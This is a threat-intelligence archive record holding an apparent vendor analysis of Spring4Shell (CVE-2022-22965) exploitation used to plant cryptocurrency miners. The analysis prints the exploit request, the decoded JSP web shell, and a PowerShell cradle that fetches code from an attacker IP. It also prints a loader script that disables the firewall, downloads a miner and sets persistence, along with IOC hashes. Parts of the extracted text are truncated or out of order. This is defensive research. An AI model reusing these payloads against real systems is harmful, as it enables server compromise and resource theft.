{
    "id": "a855f06b-9465-4cb2-9790-1ae1aa49bdbc",
    "created_at": "2023-01-12T15:07:05.464566Z",
    "updated_at": "2025-03-27T02:05:53.189098Z",
    "deleted_at": null,
    "sha1_hash": "70645f7394da2925e3c06d87b32a02025e22b9fa",
    "title": "2022-04-20 - Analyzing Attempts to Exploit the Spring4Shell Vulnerability CVE-2022-22965 to Deploy Cryptocurrency Miners",
    "authors": "",
    "file_creation_date": "2022-05-28T21:39:16Z",
    "file_modification_date": "2022-05-28T21:39:16Z",
    "file_size": 347634,
    "plain_text": "# Spring4Shell Vulnerability CVE-2022-22965 Exploited to Deploy Cryptocurrency Miners\n\n**[trendmicro.com/en_us/research/22/d/spring4shell-exploited-to-deploy-cryptocurrency-miners.html](https://www.trendmicro.com/en_us/research/22/d/spring4shell-exploited-to-deploy-cryptocurrency-miners.html)**\n\nApril 20, 2022\n\n## Creating the web shell\n\nAmong the exploitation attempts were ones aimed at deploying cryptocurrency miners. In this section, we look at how the malicious actors\nbehind these exploitation attempts create a web shell to deploy their cryptocurrency miners.\n\nThe following code is used to create the web shell:\n\n**GET /?**\n**class.module.classLoader.resources.context.parent.pipeline.first.prefix=zbc0fb&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFo**\n**c%22%2C+request.getParameter%28%22l%22%29%7D%29%3B%7D+catch+%28Exception+e%29+%7B%7D%3Bout.print%28%22%40pong%22%29%3B+%2**\n**HTTP/1.1**\n\nHost: <redacted>:<redacted>\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0\n\nAccept: */*\n\nAccept-Language: en-US,en;q=0.5\n\nX: <%\n\nY: Runtime\n\nZ: %>//\n\nAccept-Encoding: gzip\n\nThe web shell’s content is URL-encoded using the following code:\n\n%25%7Bx%7Di+try+%7BRuntime.getRuntime%28%29.exec%28System.getProperty%28%22os.name%22%29.contains%28%22ndo%22%29+%3F\n\n+new+String%5B%5D%7B%22cmd.exe%22%2C+%22%2Fc%22%2C+request.getParameter%28%22w%22%29%7D+%3A+new+String%5B%5D%7B%22%2Fbin%2\n\nc%22%2C+request.getParameter%28%22l%22%29%7D%29%3B%7D+catch+%28Exception+e%29+%7B%7D%3Bout.print%28%22%40pong%22%29%3B+%25%7B\n\nAfter decoding, the resulting payload is a Spring4Shell web shell:\n\n%{x}i try {Runtime.getRuntime().exec(System.getProperty(\"os.name\").contains(\"ndo\") ? new String[]{\"cmd.exe\", \"/c\", request.getParameter(\"w\")} : new String[]\n{\"/bi / h\" \" \"\n\n\n-----\n\n## How the payload is executed in a vulnerable system\n\nBefore executing the payload, the malicious actors first have to determine the operating system of the machine they are infecting. They do this\nusing a string check to see if “os.name” contains the word “ndo”. If it does, then the machine is identified as Windows-based, otherwise the\nmachine is identified as Linux-based.\n\nOnce the operating system is identified, the encoded payload is executed. The exploit uniform resource identifier (URI) containing the web\nshell path and parameters is shown in the following code:\n\n/zbc0fb.jsp?w=powershell.exe+-NonI+-W+Hidden+-NoP+-Exec+Bypass+-Enc+<base64 encoded content> &l=echo+<base64 encoded content>\n\nThe web shell is identified as zbc0fb.jsp, while the parameters w and l stand for, respectively, Windows and Linux payloads, which are Base64encoded.\n\nPowerShell is then executed using the following parameters:\n\nNonI: Run noninteractive session.\nW: Hide WindowStyle.\nNoP: Prevent the PowerShell profile from loading.\nExec: Make bypassing the script execution policy in PowerShell possible.\nEnc: Implement the Base64-encoded command.\n\nFor Windows payloads, the following PowerShell command fetches the script ldr.ps1 and executes it within memory without having to create it\non-disk:\n\nI.E.X. .(.N.e.w.-.O.b.j.e.c.t. .N.e.t...W.e.b.C.l.i.e.n.t.)...D.o.w.n.l.o.a.d.S.t.r.i.n.g.(.'.h.t.t.p.:././.1.9....1.4.5...2.2.7...2.1./.l.d.r...p.s.1.?.b.0.f.8.9.5._.<IP address of\npotentially vulnerable server .:.<port>._.h.t.t.p.'.).\n\nThe IP address and the port of the vulnerable server are also logged on the malicious actors’ infrastructure.\n\nThe following code shows ldr.ps1 and its execution flow — specifically, the redacted PowerShell script that downloads the cryptocurrency\n[miner and executes it. (A similar PowerShell script was previously reported by The DFIR Report.)](https://thedfirreport.com/2021/06/03/weblogic-rce-leads-to-xmrig/)\n\n**_$cc=\"http://<redacted>\"_**\n\n$sys=-join ([char[]](48..57+97..122) | Get-Random -Count (Get-Random (6..12)))\n\n$dst=\"$env:AppData\\$sys.exe\"\n\nnetsh advfirewall set allprofiles state off\n\nGet-Process network0*, *kthreaddi], kthreaddi, sysrv, sysrv012, sysrv011, sysrv010, sysrv00* -ErrorAction SilentlyContinue | Stop-Process\n\n$list = netstat -ano | findstr TCP\n\nfor ($i = 0; $i -lt $list.Length; $i++) {\n\n$k = [Text.RegularExpressions.Regex]::Split($list[$i].Trim(), '\\s+')\n\nif ($k[2] -match \"(:3333|:4444|:5555|:7777|:9000)$\") {\n\nStop-Process -id $k[4]\n\n}\n\n}\n\nif (!(Get-Process kthreaddk -ErrorAction SilentlyContinue)) {\n\n(New-Object Net.WebClient).DownloadFile(\"$cc/sys.exe\", \"$dst\")\n\nStart-Process \"$dst\" -windowstyle hidden\n\nschtasks /create /F /sc minute /mo 1 /tn \"BrowserUpdate\" /tr \"$dst\"\n\nreg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Run /d \"$dst\" /t REG_SZ /f\n\n}\n\nThe execution flow of the cryptocurrency miner involves the following steps:\n\n1.  The firewall is turned off using the netsh utility.\n\n2.  Other known cryptocurrency miners such as kthreaddi, sysrv, and sysrv012 are stopped or killed.\n\n3.  Other running processes listening on ports 3333, 4444, 5555, 7777, and 9000 are stopped.\n\n4.  If the process kthreaddk does not exist, the cryptocurrency miner downloads a binary, sys.exe, from 194[.]145[.]227[.]21 to C:\\Users\\\n<user>\\AppData\\Roaming\\<random-6-to-12-letter-string>.exe.\n\n5.  The cryptocurrency miner then starts the process with a hidden window to avoid having the user observe visual hints of the process being\nexecuted.\n\n6.  A scheduled task with the name “BrowserUpdate” is created later, running every minute. In addition, the Windows run key is modified to\nrun the binary sys exe\n\n\n-----\n\n## Conclusion and security recommendations\n\nWe are unable confirm if the exploitation attempts we analyzed for this blog entry were successful. It should be noted that we also observed\nLinux payloads where the script ldr.sh attempts to stop other running cryptocurrency miners to run its own payload.\n\n[We highly encourage users of the Spring framework to update their software to 5.3.18 and 5.2.20 or later to prevent the exploitation of](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)\nSpring4Shell (CVE-2022-22965) from occurring on their systems. More details on how Trend Micro technologies such as Trend Micro Cloud\n[One™ protect users from attacks using this vulnerability can be found in our security bulletin.](https://success.trendmicro.com/dcx/s/solution/000290730)\n\n## Indicators of compromise (IOCs)\n\nExploits & Vulnerabilities\n\n## Analyzing Attempts to Exploit the Spring4Shell Vulnerability CVE-2022-22965 to Deploy Cryptocurrency Miners\n\nRecently, we observed attempts to exploit the Spring4Shell vulnerability — a remote code execution bug, assigned as CVE-2022-22965 — by\nmalicious actors to deploy cryptocurrency miners.\n\nBy: Nitesh Surana, Ashish Verma April 20, 2022 Read time: ( words)\n\nContent added to Folio\n\nFile SHA-256 Detection name\n\nldr.ps1 093b72e9b4efcc30c1644a763697a235c9c3e496c421eceaac97d4babeba7108 Trojan.PS1.MALXMR.MPF\n\nsys.exe 566b0187d8ff500d923859c98da2c96b8b581e93ac0c94dacba76328b34412b3 PUA.Win64.CRYPTOMINER.CFL\n\nkthreaddk 67e38438759f34eaf50d8b38b6c8f18155bcc08a2e79066d9a367ea65e89aa3d Coinminer.Linux.MALXMR.SMDSL64\n\nldr.sh 93d380ba2bedd37c2313924784b26fec27c9e96e4c500b5cb78259b3c824ee4e Coinminer.SH.MALXMR.SM\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-20 - Analyzing Attempts to Exploit the Spring4Shell Vulnerability CVE-2022-22965 to Deploy Cryptocurrency Miners.pdf"
    ],
    "report_names": [
        "2022-04-20 - Analyzing Attempts to Exploit the Spring4Shell Vulnerability CVE-2022-22965 to Deploy Cryptocurrency Miners.pdf"
    ],
    "threat_actors": [
        {
            "id": "21e01940-3851-417f-9e90-1a4a2da07033",
            "created_at": "2022-10-25T16:07:23.299369Z",
            "updated_at": "2025-03-27T02:02:09.725295Z",
            "deleted_at": null,
            "main_name": "Agrius",
            "aliases": [
                "AMERICIUM",
                "Agonizing Serpens",
                "BlackShadow",
                "DEV-0227",
                "Pink Sandstorm",
                "SharpBoys"
            ],
            "source_name": "ETDA:Agrius",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Agrius",
                "BFG Agonizer",
                "BFG Agonizer Wiper",
                "DEADWOOD",
                "DETBOSIT",
                "Detbosit",
                "IPsec Helper",
                "Moneybird",
                "MultiLayer Wiper",
                "PW",
                "PartialWasher",
                "PartialWasher Wiper",
                "SQLShred",
                "Sqlextractor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536025,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653773956,
    "ts_modification_date": 1653773956,
    "files": {
        "pdf": "https://archive.orkl.eu/70645f7394da2925e3c06d87b32a02025e22b9fa.pdf",
        "text": "https://archive.orkl.eu/70645f7394da2925e3c06d87b32a02025e22b9fa.txt",
        "img": "https://archive.orkl.eu/70645f7394da2925e3c06d87b32a02025e22b9fa.jpg"
    }
}